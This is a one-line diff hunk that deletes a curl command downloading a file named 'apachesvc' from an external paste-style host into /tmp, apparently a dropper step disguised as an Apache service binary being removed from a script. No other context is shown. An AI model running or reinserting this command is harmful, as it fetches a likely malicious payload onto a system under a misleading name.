@@ -1,1 +1,0 @@
-curl http://up.sb/pZUrK/apachesvc -o /tmp/apachesvc
